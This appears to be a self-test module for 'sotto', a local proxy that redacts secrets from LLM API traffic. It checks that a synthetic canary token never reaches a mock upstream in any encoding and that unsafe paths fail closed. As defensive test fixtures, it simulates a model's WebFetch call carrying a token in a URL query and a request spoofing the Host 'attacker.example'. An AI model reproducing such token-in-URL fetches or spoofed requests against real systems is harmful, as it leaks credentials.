"""`sotto selftest`: a canary secret goes through the proxy to a local mock upstream.

Everything runs in this process over ASGI transports: no port is opened and nothing leaves
the machine. The test fails if any form of the canary (raw, JSON-escaped, base64, URL-encoded)
reaches the mock upstream, or if restore, the tool policy or a fail-closed path misbehaves.
"""

from __future__ import annotations

import base64
import json
import secrets
import string
import urllib.parse

import httpx
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import JSONResponse, Response
from starlette.routing import Route

from .proxy import Proxy
from .redact import Redactor
from .vault import PLACEHOLDER, Vault


def make_canary() -> str:
    """A fresh random string in GitHub's token format. Synthetic: it opens nothing."""
    return "ghp_" + "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(36))


class MockUpstream:
    """Records every byte it receives and echoes placeholders back the way a model might."""

    def __init__(self):
        self.received: list[bytes] = []
        self.app = Starlette(routes=[Route("/{path:path}", self.handle, methods=["GET", "POST"])])

    async def handle(self, request: Request) -> Response:
        body = await request.body()
        self.received.append(request.url.path.encode() + b"?" + request.url.query.encode() + b"\n"
                             + b"\n".join(f"{k}: {v}".encode() for k, v in request.headers.items()) + b"\n\n" + body)
        if request.url.path == "/v1/messages/count_tokens":
            return JSONResponse({"input_tokens": 42})
        if request.url.path != "/v1/messages":
            return JSONResponse({"ok": True})
        req = json.loads(body)
        found = PLACEHOLDER.findall(body.decode())
        ph = f"SOTTO_{found[0][0]}_{found[0][1]}" if found else "none"
        if req.get("stream"):
            return Response(self.stream(ph), media_type="text/event-stream")
        return JSONResponse({
            "id": "msg_selftest", "type": "message", "role": "assistant", "model": req.get("model"),
            "content": [
                {"type": "text", "text": f"The token {ph} is set."},
                {"type": "tool_use", "id": "toolu_w", "name": "Write", "input": {"file_path": "/tmp/x", "content": f"TOKEN={ph}\n"}},
                {"type": "tool_use", "id": "toolu_f", "name": "WebFetch", "input": {"url": f"https://example.com/?t={ph}"}},
            ],
            "stop_reason": "tool_use", "usage": {"input_tokens": 1, "output_tokens": 1},
        })


    @staticmethod
    def stream(ph: str) -> str:
        """A realistic SSE answer with the placeholder split across deltas."""
        def ev(data):
            return f"event: {data['type']}\ndata: {json.dumps(data)}\n\n"

        cut = len(ph) // 2
        tool_json = json.dumps({"file_path": "/tmp/x", "content": f"TOKEN={ph}\n"})
        fetch_json = json.dumps({"url": f"https://example.com/?t={ph}"})
        out = [ev({"type": "message_start", "message": {"id": "msg_s", "type": "message", "role": "assistant", "content": []}}),
               ev({"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}}),
               ev({"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": f"The token {ph[:cut]}"}}),
               ev({"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": f"{ph[cut:]} is set."}}),
               ev({"type": "content_block_stop", "index": 0})]
        for i, name, js in ((1, "Write", tool_json), (2, "WebFetch", fetch_json)):
            out.append(ev({"type": "content_block_start", "index": i, "content_block": {"type": "tool_use", "id": f"toolu_{i}", "name": name, "input": {}}}))
            mid = len(js) // 2
            for part in (js[:mid], js[mid:]):
                out.append(ev({"type": "content_block_delta", "index": i, "delta": {"type": "input_json_delta", "partial_json": part}}))
            out.append(ev({"type": "content_block_stop", "index": i}))
        out.append(ev({"type": "message_stop"}))
        return "".join(out)


def _forms(canary: str) -> list[bytes]:
    return [canary.encode(), json.dumps(canary).strip('"').encode(), base64.b64encode(canary.encode()),
            urllib.parse.quote(canary).encode(), canary[4:].encode()]


async def run(detector, verbose: bool = True) -> bool:
    canary = make_canary()
    mock = MockUpstream()
    upstream = httpx.AsyncClient(transport=httpx.ASGITransport(app=mock.app), base_url="http://upstream.test")
    proxy = Proxy(Redactor(detector, Vault(secrets.token_bytes(32))), upstream="http://upstream.test",
                  client=upstream, stats_token="selftest")
    client = httpx.AsyncClient(transport=httpx.ASGITransport(app=proxy.app), base_url="http://127.0.0.1:7788")
    auth = {"x-api-key": "sk-ant-selftest-not-a-key", "anthropic-version": "2023-06-01"}
    body = {
        "model": "claude-opus-5-5", "max_tokens": 64,
        "system": [{"type": "text", "text": f"Environment: GITHUB_TOKEN={canary}"}],
        "messages": [
            {"role": "user", "content": f"Why does `gh auth login --with-token {canary}` fail?"},
            {"role": "assistant", "content": [{"type": "tool_use", "id": "toolu_1", "name": "Bash", "input": {"command": f"echo {canary}"}}]},
            {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "toolu_1", "content": f"{canary}\n"}]},
        ],
    }
    results: list[tuple[str, bool]] = []

    def check(name, ok):
        results.append((name, bool(ok)))

    r = await client.post("/v1/messages", json=body, headers=auth)
    out = r.json() if r.status_code == 200 else {}
    content = out.get("content", [{}, {}, {}])
    check("request forwarded (200)", r.status_code == 200)
    check("assistant text restored", canary in content[0].get("text", ""))
    check("Write tool input restored", canary in json.dumps(content[1].get("input", {})))
    check("WebFetch tool input keeps the placeholder", canary not in json.dumps(content[2].get("input", {}))
          and PLACEHOLDER.search(json.dumps(content[2].get("input", {}))))
    check("auth header passed through", any(b"x-api-key: sk-ant-selftest-not-a-key" in b for b in mock.received))

    r = await client.post("/v1/messages/count_tokens", json=body, headers=auth)
    check("count_tokens forwarded", r.status_code == 200)
    r = await client.post("/v1/messages", json={**body, "stream": True}, headers=auth)
    streamed = _assemble_stream(r.text) if r.status_code == 200 else {}
    check("streamed text restored (placeholder split across deltas)", canary in streamed.get(0, ""))
    check("streamed Write input restored", canary in streamed.get(1, ""))
    check("streamed WebFetch input keeps the placeholder", canary not in streamed.get(2, canary) and PLACEHOLDER.search(streamed.get(2, "")))

    sent = len(mock.received)
    r = await client.post("/v1/messages", content=b'{"messages": [' + canary.encode(), headers=auth)
    check("malformed JSON rejected, not sent", r.status_code == 400 and len(mock.received) == sent)
    r = await client.post("/v1/files", content=canary.encode(), headers=auth)
    check("unscanned endpoint with a body blocked", r.status_code == 403 and len(mock.received) == sent)
    r = await client.post("/v1/messages", json=body, headers={**auth, "host": "attacker.example"})
    check("non-local Host rejected", r.status_code == 403 and len(mock.received) == sent)

    class Broken:
        def detect(self, text):
            raise RuntimeError("detector down")

    broken = Proxy(Redactor(Broken(), Vault(secrets.token_bytes(32))), upstream="http://upstream.test", client=upstream)
    bclient = httpx.AsyncClient(transport=httpx.ASGITransport(app=broken.app), base_url="http://127.0.0.1:7788")
    r = await bclient.post("/v1/messages", json=body, headers=auth)
    check("detector failure blocks the request", r.status_code == 500 and len(mock.received) == sent)

    r = await client.get("/_sotto/stats", headers={"authorization": "Bearer selftest"})
    stats = r.text
    check("stats feed served with the token", r.status_code == 200 and json.loads(stats)["redacted"].get("SECRET", 0) >= 4)
    check("stats feed holds no value or placeholder", canary not in stats and not PLACEHOLDER.search(stats))
    r = await client.get("/_sotto/stats")
    check("stats feed refused without the token", r.status_code == 401)

    leaked = [f for f in _forms(canary) if any(f in b for b in mock.received)]
    check("CANARY NEVER REACHED UPSTREAM (raw, escaped, base64, url, body)", not leaked)
    await client.aclose()
    await bclient.aclose()
    await upstream.aclose()
    if verbose:
        for name, ok in results:
            print(f"  {'✓' if ok else '✗'} {name}")
    return all(ok for _, ok in results)


def _assemble_stream(text: str) -> dict[int, str]:
    """Concatenated text or tool JSON per block index."""
    blocks: dict[int, str] = {}
    for raw in text.split("\n\n"):
        data = next((line[5:].strip() for line in raw.splitlines() if line.startswith("data:")), None)
        if not data:
            continue
        d = json.loads(data)
        if d.get("type") == "content_block_delta":
            delta = d["delta"]
            blocks[d["index"]] = blocks.get(d["index"], "") + delta.get("text", delta.get("partial_json", ""))
    return blocks
